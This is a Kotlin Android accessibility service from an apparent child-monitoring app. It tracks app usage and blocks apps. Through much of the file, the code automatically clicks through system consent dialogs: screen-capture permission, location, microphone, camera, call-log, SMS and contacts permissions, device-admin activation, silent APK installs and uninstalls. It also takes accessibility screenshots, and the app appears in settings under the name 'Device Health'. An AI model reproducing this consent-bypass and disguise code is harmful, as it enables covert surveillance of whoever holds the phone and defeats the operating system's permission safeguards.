package com.familyguard.child.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.graphics.Bitmap
import android.Manifest
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.Process
import android.os.SystemClock
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.familyguard.child.BlockAction
import com.familyguard.child.RulesEngine
import com.familyguard.child.admin.AdminReceiver
import com.familyguard.child.data.Store
import com.familyguard.child.ui.BlockOverlay
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class EnforcementService : AccessibilityService() {

    private var prevPkg: String? = null
    private var prevTs = 0L

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Store.accessibilityLostAt = 0L
        prevTs = System.currentTimeMillis()
        if (Store.usageDate == Store.today()) {
            minutesToday.putAll(Store.loadUsage())
        } else {
            Store.saveUsage(emptyMap(), Store.today())
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev = event ?: return
        if (ev.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = ev.packageName?.toString() ?: return
        // Installer/uninstaller window dikha? Timestamp refresh karo — AgeRelease ka
        // uninstall loop isi se pata karta hai ki dialog abhi screen par khula hai
        // (dobara ACTION_DELETE fire karke dialogs stack na kare).
        if (pkg in INSTALLER_PKGS) lastInstallerSeenAt = SystemClock.elapsedRealtime()
        if (pkg == packageName) return

        // Reboot recovery: the system MediaProjection consent dialog just opened after
        // WE requested it (ConsentActivity arms the timestamp). Click "Start now"
        // automatically so mirroring works without touching the child phone.
        // Package is usually systemui, but some OEMs host the dialog elsewhere.
        // ANDROID 14/15 RELAX: className match optional — OEMs (MIUI/HyperOS,
        // ColorOS) consent dialog ke liye GENERIC className bhejte hain (widget class
        // ya wrapper activity), jisse pehle match fail hota tha aur auto-click loop
        // KABHI start hi nahi hota (dialog khadi rehti thi, mirror dead). Ab consent
        // in-flight ho to dialog-host package ka KOI BHI window event click loop
        // chala dega — click pass khud safe hai (exact positive labels + sirf
        // projection-host packages par rightmost-Button fallback).
        if (pkg in PROJECTION_DIALOG_PKGS &&
            (isProjectionDialog(ev.className?.toString()) ||
                (Store.projectionRequestedAt > 0L &&
                    SystemClock.elapsedRealtime() - Store.projectionRequestedAt in 0..60_000L))
        ) {
            maybeAutoConfirmProjection()
            return
        }

        // Wizard auto-grant: a permission step is armed (autoClickStep + deadline) —
        // click the matching system dialog buttons / toggles for it.
        if (Store.autoClickUntil > 0L && SystemClock.elapsedRealtime() <= Store.autoClickUntil) {
            if (pkg in ALLOW_PKGS) maybeAutoGrant()
            return
        }

        val now = System.currentTimeMillis()
        prevPkg?.let { prev ->
            if (prev != pkg) {
                val mins = ((now - prevTs) / 60000L).toInt()
                if (mins > 0) minutesToday.merge(prev, mins, Int::plus)
            }
        }
        prevPkg = pkg
        prevTs = now
        lastApp = pkg

        if (Store.today() != Store.usageDate) {
            minutesToday.clear()
            Store.saveUsage(emptyMap(), Store.today())
        }

        if (!Store.released) {
            when (val d = RulesEngine.decide(pkg)) {
                is BlockAction.APP_BLOCK ->
                    BlockOverlay.show(applicationContext, BlockOverlay.Reason.APP_BLOCK, "App blocked", d.label)
                is BlockAction.TIME_OVER ->
                    BlockOverlay.show(applicationContext, BlockOverlay.Reason.TIME_OVER, "Screen time over", "Daily limit reached")
                is BlockAction.BEDTIME ->
                    BlockOverlay.show(applicationContext, BlockOverlay.Reason.BEDTIME, "Bedtime", "Phone is locked until morning")
                is BlockAction.SCHEDULE ->
                    BlockOverlay.show(applicationContext, BlockOverlay.Reason.SCHEDULE, "Scheduled block", d.name)
                BlockAction.NONE -> BlockOverlay.hideIfAppBlock()
            }
        }
    }

    override fun onInterrupt() {}

    override fun onUnbind(intent: Intent?): Boolean {
        instance = null
        // Accessibility was turned off — record it so the SelfHeal watchdog can
        // raise the alarm (event to the parent + full-screen fix notification).
        Store.accessibilityLostAt = System.currentTimeMillis()
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    companion object {
        @Volatile
        var lastApp = ""

        // ---- uninstall-dialog foreground tracking (AgeRelease loop ke liye) ----

        /** Packages jo system ka uninstall/install confirm dialog host karte hain. */
        val INSTALLER_PKGS = setOf(
            "com.android.packageinstaller",
            "com.google.android.packageinstaller",
            "com.miui.packageinstaller",
            "com.miui.securitycenter",
            "com.samsung.android.packageinstaller"
        )

        /** Last time jab installer dialog window screen par dikha (elapsedRealtime).
         *  0 = kabhi nahi. AgeRelease.fireUninstall isse stacked-dialog guard me use karta hai. */
        @Volatile
        var lastInstallerSeenAt = 0L

        val minutesToday = ConcurrentHashMap<String, Int>()

        @Volatile
        var instance: EnforcementService? = null

        fun disableSelfSafe() {
            runCatching { instance?.disableSelf() }
        }

        fun persist(ctx: Context) {
            Store.saveUsage(minutesToday.toMap(), Store.today())
        }

        // ---- projection consent auto-confirm ----

        private val confirmHandler = Handler(Looper.getMainLooper())

        @Volatile
        private var confirmAttempts = 0

        // ---- consent auto-click HONEST DIAG (vc13) ----
        // Phone check ab andaza nahi karta: pass chala ya nahi (clickPassRuns),
        // dialog ka button dikha ya nahi (clickPassSawBtn), dialog kis package me
        // dikha (lastDialogPkg). Android 15 "auto-click block" vs "dialog a11y me
        // dikha hi nahi" — dono ab report me alag dikhenge.
        @Volatile
        var clickPassRuns = 0

        @Volatile
        var clickPassSawBtn = false

        @Volatile
        var lastDialogPkg = ""

        fun resetClickDiag() {
            clickPassRuns = 0
            clickPassSawBtn = false
            lastDialogPkg = ""
        }

        /** Android 13+ a11y ka APNA screenshot — MediaProjection consent ki
         *  zaroorat NAHI. vc13 se screenshot feature projection-par-depend nahi
         *  karta: jab mirror streaming chal rahi ho to captureOnce (live frame)
         *  jeeta hai, warna yeh. (API 33+ 3-arg takeScreenshot — is compileSdk
         *  ka stub sirf displayId wala overload deta hai.) Hardware bitmap
         *  software-copy hota hai (compress sirf software bitmap par chalta hai);
         *  rate-limit par 1 retry. */
        fun captureViaA11y(): Bitmap? {
            val svc = instance ?: return null
            if (Build.VERSION.SDK_INT < 33) return null
            if (!a11yShotCapable()) return null
            for (attempt in 1..2) {
                val latch = CountDownLatch(1)
                var bmp: Bitmap? = null
                runCatching {
                    svc.takeScreenshot(
                        android.view.Display.DEFAULT_DISPLAY,
                        ContextCompat.getMainExecutor(svc),
                        object : AccessibilityService.TakeScreenshotCallback {
                            override fun onSuccess(res: AccessibilityService.ScreenshotResult) {
                                try {
                                    bmp = Bitmap.wrapHardwareBuffer(res.hardwareBuffer, res.colorSpace)
                                } finally {
                                    runCatching { res.hardwareBuffer.close() }
                                    latch.countDown()
                                }
                            }

                            override fun onFailure(errorCode: Int) {
                                latch.countDown()
                            }
                        }
                    )
                }.onFailure { latch.countDown() }
                runCatching { latch.await(5, TimeUnit.SECONDS) }
                val hw = bmp
                if (hw != null) {
                    return runCatching { hw.copy(Bitmap.Config.ARGB_8888, false) }.getOrNull() ?: hw
                }
                if (attempt == 1) runCatching { Thread.sleep(1100) } // interval rate-limit
            }
            return null
        }

        /** a11y screenshot capability ON hai? (config canTakeScreenshot + service
         *  bound + Android 13+). mirror_diag "a11yShot" isi se aata hai. */
        fun a11yShotCapable(): Boolean {
            val svc = instance ?: return false
            if (Build.VERSION.SDK_INT < 33) return false
            val caps = runCatching { svc.serviceInfo?.capabilities ?: 0 }.getOrDefault(0)
            return caps and AccessibilityServiceInfo.CAPABILITY_CAN_TAKE_SCREENSHOTS != 0
        }

        /** Positive buttons we are allowed to click, exact lowercase match.
         *  Chinese labels bhi — kuch parivaar ke phones Chinese-locale ROM par
         *  chalte hain (MIUI/HyperOS default 中文): wahan consent dialog ka
         *  button "立即开始" hota hai, English/Hindi match kabhi hit hi nahi hota
         *  aur dialog screen par khadi reh jaati thi (mirror dead). */
        private val POSITIVE_ACTIONS = setOf(
            "start now", "start", "start recording", "start casting",
            "start screen capture", "start screen sharing", "start sharing",
            "start mirroring", "start screen recording", "start screencast",
            "share screen", "share entire screen", "share this screen", "share",
            "share full screen", "share whole screen",
            "अभी शुरू करें", "शुरू करें", "अभी प्रारंभ करें", "प्रारंभ करें",
            "स्क्रीन साझा करें", "साझा करें", "शेयर करें",
            "立即开始", "开始", "开始录制", "开始投屏", "开始镜像", "开始屏幕共享",
            "开始共享", "分享屏幕", "共享屏幕", "分享整个屏幕"
        )

        /** Android 14+ chooser: make sure the whole screen is the selected option.
         *  Android 15 ka naya dialog alag-alag OEM par alag label use karta hai —
         *  "one app active"/single-app mode select reh gaya to sirf HUMARI app
         *  capture hoti thi (kaali screen + green box recording me). */
        private val ENTIRE_SCREEN_LABELS = listOf(
            "entire screen", "full screen", "whole screen", "entire display",
            "share full screen", "share entire screen", "share whole screen",
            "पूरी स्क्रीन", "पूरा स्क्रीन",
            "整个屏幕", "完整屏幕"
        )

        private fun isProjectionDialog(className: String?): Boolean {
            if (className == null) return false
            val c = className.lowercase()
            // Broad match: OEMs rename the consent dialog class (MIUI/HyperOS, ColorOS,
            // One UI). Missing one meant the dialog sat on screen with no auto-click.
            return c.contains("mediaprojection") || c.contains("projection") ||
                c.contains("screencapture") || c.contains("screen_capture") ||
                c.contains("screenrecord") || c.contains("screen_record") ||
                c.contains("screencast") || c.contains("screen_cast") ||
                c.contains("castdialog") || c.contains("mirrordialog")
        }

        /** ConsentActivity launch hote hi DIRECT arm — event-class match ka wait
         *  nahi (kuch OEMs generic className bhejte hain, tab event-trigger kabhi
         *  fire hi nahi hota tha). A11y service bound na ho (OFF) to no-op — phir
         *  dialog bachche ko manual dikhayi degi, jo sahi fallback hai. */
        fun armProjectionConfirm() {
            val svc = instance ?: return
            runCatching { svc.maybeAutoConfirmProjection() }
        }

        /** GalleryPermActivity launch hote hi DIRECT arm — wizard step "gallery"
         *  ka Allow-click loop turant start (background permission request ke
         *  bina event-based trigger slow phones par late ho jata tha). */
        fun armGalleryAllow() {
            val svc = instance ?: return
            runCatching { svc.maybeAutoGrant() }
        }

        // ---- wizard auto-grant ----

        @Volatile
        private var grantAttempts = 0

        /** System packages whose windows may be auto-clicked while a step is armed. */
        val ALLOW_PKGS = setOf(
            "com.android.settings", "com.android.systemui", "android",
            "com.google.android.permissioncontroller", "com.android.permissioncontroller",
            "com.android.packageinstaller",
            // Installer/uninstaller dialogs (uninstall auto-confirm + silent update):
            // AOSP dialog com.android.packageinstaller me aata hai, lekin OEMs apna
            // installer host karte hain — bina inke uninstall/update dialog par
            // click kabhi nahi hota.
            "com.google.android.packageinstaller",
            "com.miui.packageinstaller", "com.miui.securitycenter",
            "com.samsung.android.packageinstaller"
        )

        /** Packages that may host the MediaProjection consent dialog. */
        private val PROJECTION_DIALOG_PKGS = ALLOW_PKGS + setOf(
            "com.miui.securitycenter", "com.miui.home",
            "com.coloros.safecenter", "com.oplus.safecenter",
            "com.samsung.android.permissioncontroller"
        )

        /** Exact lowercase button labels per armed step — nothing else is ever clicked.
         *  Chinese labels bhi (Chinese-locale ROMs par system dialog Allow = "允许"). */
        val ALLOW_EXACT: Map<String, Set<String>> = mapOf(
            "loc" to setOf("allow all the time", "while using the app", "only this time", "allow",
                "始终允许", "仅在使用中允许", "仅使用时允许", "仅本次允许", "允许"),
            "cam" to setOf("allow", "only this time", "允许", "仅本次允许"),
            // Mic runtime permission self-heal (audio_start jab RECORD_AUDIO miss ho):
            // system permission dialog par Allow/While-using khud click hota hai.
            "mic" to setOf("allow", "while using the app", "only this time",
                "允许", "仅在使用中允许", "仅使用时允许", "仅本次允许"),
            "calls" to setOf("allow", "允许"),
            // Gallery (Android 13/14/15): 13 par plain "Allow", 14+ photo-picker
            // choice "Allow all" / "Select photos and videos" — hum "Allow/Allow
            // all" click karte hain (partial selection humare loop ko stuck nahi
            // karega — stepDone usko bhi accept karta hai).
            "gallery" to setOf("allow", "allow all", "select all", "अनुमति दें", "允许"),
            // Android 13+ runtime notification permission dialog (auto-setup ka
            // "postnotif" step) — Allow click ke bina notifications invisible rehti hain.
            "postnotif" to setOf("allow", "允许"),
            "battery" to setOf("allow", "允许"),
            "admin" to setOf(
                "activate", "activate device administrator",
                "इस ऐप्लिकेशन को चालू करें", "चालू करें", "सक्रिय करें",
                "激活", "激活设备管理器"
            ),
            "notif" to setOf("allow", "अनुमति दें", "允许"),
            // Self-uninstall confirm dialog (Remove device / 18+ release):
            // AOSP: "Do you want to uninstall this app?" [OK], MIUI/Samsung apna
            // text use karte hain. Sirf release/uninstall armed hone par hi armed
            // window (120 s) me click hota hai.
            "uninstall" to setOf(
                "ok", "uninstall", "uninstall anyway", "uninstall for all users",
                "इस ऐप को अनइंस्टॉल करें", "अनइंस्टॉल करें", "अनइंस्टॉल",
                "确定", "卸载", "仍然卸载"
            ),
            // Silent self-update: child app naya APK install karta hai — system
            // install confirm par khud "Install" click ho jata hai. MIUI/ColorOS
            // apne beech me "Continue" screen bhi dikhaate hain — wahi bhi
            // cover karo (dialog linkUpdateReceiver se khulta hai).
            "install" to setOf(
                "install", "install anyway", "continue", "continue install",
                "इंस्टॉल करें", "इंस्टॉल करें।", "जारी रखें",
                "安装", "仍然安装", "继续安装"
            )
        )
    }

    private fun maybeAutoConfirmProjection() {
        val requestedAt = Store.projectionRequestedAt
        if (requestedAt <= 0L || !Store.paired || Store.released) return
        val dt = SystemClock.elapsedRealtime() - requestedAt
        if (dt < 0L || dt > 60_000L) return
        if (confirmAttempts > 0) return // retry loop already running
        resetClickDiag()
        confirmAttempts = 1
        confirmHandler.postDelayed({ attemptConfirm(1) }, 350L)
    }

    private fun attemptConfirm(n: Int) {
        confirmAttempts = n
        val clicked = runCatching { projectionClickPass() }.getOrDefault(false)
        if (clicked) {
            Store.projectionRequestedAt = 0L
            confirmAttempts = 0
            return
        }
        val requestedAt = Store.projectionRequestedAt
        val stillFresh = requestedAt > 0L && SystemClock.elapsedRealtime() - requestedAt <= 60_000L
        // Cold devices can take 10+ s to actually render the dialog after a reboot —
        // keep retrying ~20 s (40 x 500 ms) before giving up.
        if (n < 40 && stillFresh) {
            confirmHandler.postDelayed({ attemptConfirm(n + 1) }, 500L)
        } else {
            confirmAttempts = 0
        }
    }

    /** One pass over EVERY a11y window: "entire screen" select + positive button
     *  click. ANDROID 15 FIX (vc13): pehle pass sirf rootInActiveWindow scan karta
     *  tha — consent dialog kuch phones par active window NAHI hota (ConsentActivity
     *  apni translucent window active rakhti hai), isliye "Start now" KABHI nahi
     *  milta tha => dialog khadi rehti thi, frames 0. Ab saari a11y windows (incl.
     *  SystemUI dialog) scan hoti hain. Returns true once a button was clicked. */
    private fun projectionClickPass(): Boolean {
        clickPassRuns++
        val roots = mutableListOf<AccessibilityNodeInfo>()
        runCatching { rootInActiveWindow?.let { roots.add(it) } }
        runCatching {
            windows?.forEach { w -> runCatching { w.root?.let { r -> roots.add(r) } } }
        }
        for (root in roots) {
            val pkg = root.packageName?.toString() ?: continue
            if (pkg in PROJECTION_DIALOG_PKGS && lastDialogPkg.isBlank()) lastDialogPkg = pkg
        }
        var clickedAny = false
        for (root in roots) {
            for (label in ENTIRE_SCREEN_LABELS) {
                for (n in runCatching { root.findAccessibilityNodeInfosByText(label) }.getOrNull().orEmpty()) {
                    if (n.isCheckable && !n.isSelected) clickDeep(n)
                }
            }
            val matches = mutableSetOf<AccessibilityNodeInfo>()
            for (needle in listOf("start", "share", "शुरू", "प्रारंभ", "साझा", "शेयर", "开始", "立即", "共享")) {
                runCatching { matches.addAll(root.findAccessibilityNodeInfosByText(needle)) }
            }
            for (n in matches) {
                val text = (n.text ?: n.contentDescription)?.toString()?.trim()?.lowercase() ?: continue
                if (text in POSITIVE_ACTIONS && !n.isCheckable) {
                    clickPassSawBtn = true
                    if (clickDeep(n)) { clickedAny = true; return true }
                }
            }
        }
        // GENERIC FALLBACK (locale-proof): text match na ho (koi bhi language) to
        // dialog ke bottom-right most clickable Button par click karo — Android
        // convention me POSITIVE button hamesha rightmost/bottommost hota hai.
        // Sirf projection dialog host packages par aur armed window me hi chalega.
        for (root in roots) {
            val pkg = root.packageName?.toString() ?: continue
            if (pkg in PROJECTION_DIALOG_PKGS && clickPositiveByPosition(root)) return true
        }
        return clickedAny
    }

    /** Dialog ke sabse rightmost+bottom clickable button par click (positive
     *  convention). Sirf isProjectionDialog window par — blind click kahin nahi. */
    private fun clickPositiveByPosition(root: AccessibilityNodeInfo): Boolean {
        val pkg = root.packageName?.toString() ?: return false
        if (pkg !in PROJECTION_DIALOG_PKGS) return false
        var best: AccessibilityNodeInfo? = null
        var bestX = Int.MIN_VALUE
        var bestY = Int.MIN_VALUE
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var visited = 0
        while (stack.isNotEmpty() && visited < 400) {
            val n = stack.removeFirst()
            visited++
            val cls = n.className?.toString() ?: ""
            if (cls.endsWith("Button") && n.isClickable && !n.isCheckable) {
                val r = android.graphics.Rect()
                runCatching { n.getBoundsInScreen(r) }.getOrDefault(false)
                if (r.right > bestX || (r.right == bestX && r.bottom > bestY)) {
                    bestX = r.right; bestY = r.bottom; best = n
                }
            }
            for (i in 0 until n.childCount) {
                runCatching { n.getChild(i) }.getOrNull()?.let { stack.add(it) }
            }
        }
        if (best != null) clickPassSawBtn = true
        return best != null && clickDeep(best)
    }

    private fun clickDeep(node: AccessibilityNodeInfo): Boolean {
        var cur: AccessibilityNodeInfo? = node
        var hops = 0
        while (cur != null && hops < 4) {
            val target = cur
            if (target.isClickable) {
                return runCatching { target.performAction(AccessibilityNodeInfo.ACTION_CLICK) }.getOrDefault(false)
            }
            cur = target.parent
            hops++
        }
        return false
    }

    // ---- wizard auto-grant engine ----

    private fun maybeAutoGrant() {
        if (grantAttempts > 0) return // retry loop already running
        grantAttempts = 1
        confirmHandler.postDelayed({ attemptGrant(1) }, 350L)
    }

    private fun attemptGrant(n: Int) {
        val step = Store.autoClickStep
        if (step.isBlank() || SystemClock.elapsedRealtime() > Store.autoClickUntil) {
            grantAttempts = 0
            return
        }
        val finished = runCatching { autoGrantPass(step) }.getOrDefault(false)
        // Uninstall/install dialogs slow phones par bohot der baad dikhte hain —
        // armed window ~120 s hai, retry loop usse thoda aage tak chale.
        val maxTries = if (step == "uninstall" || step == "install") 300 else 60
        if (finished || n >= maxTries) {
            grantAttempts = 0
            return
        }
        grantAttempts = n + 1
        confirmHandler.postDelayed({ attemptGrant(n + 1) }, 450L)
    }

    /** One pass for the armed step. Returns true once the step's permission is ON. */
    private fun autoGrantPass(step: String): Boolean {
        val ctx = applicationContext
        if (stepDone(step, ctx)) return true
        return when (step) {
            "usage" -> clickAppRowToggle()
            "overlay" -> clickFirstUncheckedToggle()
            // Install-unknown-apps screen: per-app toggle list — humari row flip karo
            "unknown" -> clickAppRowToggle()
            else -> clickExact(step)
        }
    }

    private fun stepDone(step: String, ctx: Context): Boolean = runCatching {
        when (step) {
            "loc" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
            "mic" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
            "cam" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
            "calls" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
            // Gallery: full grant (READ_MEDIA_IMAGES) YA Android 14 partial
            // (READ_MEDIA_VISUAL_USER_SELECTED) — partial par gallery sirf
            // selected photos dikhayegi, par auto-grant loop KABHI stuck nahi
            // hoga. Android 12-: purana READ_EXTERNAL_STORAGE.
            "gallery" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED ||
                (Build.VERSION.SDK_INT >= 34 && ContextCompat.checkSelfPermission(
                    ctx, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED"
                ) == PackageManager.PERMISSION_GRANTED)
            "battery" -> (ctx.getSystemService(Context.POWER_SERVICE) as PowerManager)
                .isIgnoringBatteryOptimizations(ctx.packageName)
            "admin" -> (ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager)
                .isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
            "usage" -> {
                val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
                appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName) == AppOpsManager.MODE_ALLOWED
            }
            "overlay" -> Settings.canDrawOverlays(ctx)
            "notif" -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
            // Install-unknown-apps: silent APK update ke liye zaroori
            "unknown" -> runCatching { ctx.packageManager.canRequestPackageInstalls() }.getOrDefault(false)
            // install/uninstall steps kabhi "done" nahi hote — click hi success hai
            else -> false
        }
    }.getOrDefault(false)

    /** Click an exact-label button (Allow / Activate / …) on the current window. */
    private fun clickExact(step: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val wanted = ALLOW_EXACT[step] ?: return false
        for (needle in wanted) {
            for (n in root.findAccessibilityNodeInfosByText(needle)) {
                val text = (n.text ?: n.contentDescription)?.toString()?.trim()?.lowercase() ?: continue
                if (text in wanted && !n.isCheckable && clickDeep(n)) return true
            }
        }
        // Hindi "While using the app" is a long string — safe contains rule.
        if (step == "loc") {
            for (n in root.findAccessibilityNodeInfosByText("उपयोग करते समय")) {
                if (!n.isCheckable && clickDeep(n)) return true
            }
        }
        // Mic permission dialog ka Hindi text bhi lamba hota hai — contains rule.
        if (step == "mic") {
            for (needle in listOf("करते समय", "इस बार ही", "अनुमति दें")) {
                for (n in root.findAccessibilityNodeInfosByText(needle)) {
                    val text = (n.text ?: n.contentDescription)?.toString()?.trim() ?: continue
                    if ("न दें" in text) continue // "अनुमति न दें" (deny) par kabhi click nahi
                    if (!n.isCheckable && clickDeep(n)) return true
                }
            }
        }
        return false
    }

    /** Usage/notification lists: find our app's row ("Device Health") and flip its toggle. */
    private fun clickAppRowToggle(): Boolean {
        val root = rootInActiveWindow ?: return false
        for (label in listOf("device health", packageName)) {
            for (t in root.findAccessibilityNodeInfosByText(label)) {
                var row: AccessibilityNodeInfo? = t
                var hops = 0
                while (row != null && hops < 5) {
                    val current = row
                    val sw = findCheckable(current, 24)
                    if (sw != null) {
                        return if (!sw.isChecked) {
                            sw.performAction(AccessibilityNodeInfo.ACTION_CLICK) || clickDeep(sw)
                        } else true
                    }
                    row = current.parent
                    hops++
                }
            }
        }
        return false
    }

    /** Overlay single-app screen: flip the one toggle that is off. */
    private fun clickFirstUncheckedToggle(): Boolean {
        val root = rootInActiveWindow ?: return false
        val sw = findCheckable(root, 40) ?: return false
        return if (!sw.isChecked) {
            sw.performAction(AccessibilityNodeInfo.ACTION_CLICK) || clickDeep(sw)
        } else true
    }

    private fun findCheckable(node: AccessibilityNodeInfo, budget: Int): AccessibilityNodeInfo? {
        if (node.isCheckable) return node
        if (budget <= 0) return null
        for (i in 0 until node.childCount) {
            val child = runCatching { node.getChild(i) }.getOrNull() ?: continue
            val found = findCheckable(child, budget - 1)
            if (found != null) return found
        }
        return null
    }
}
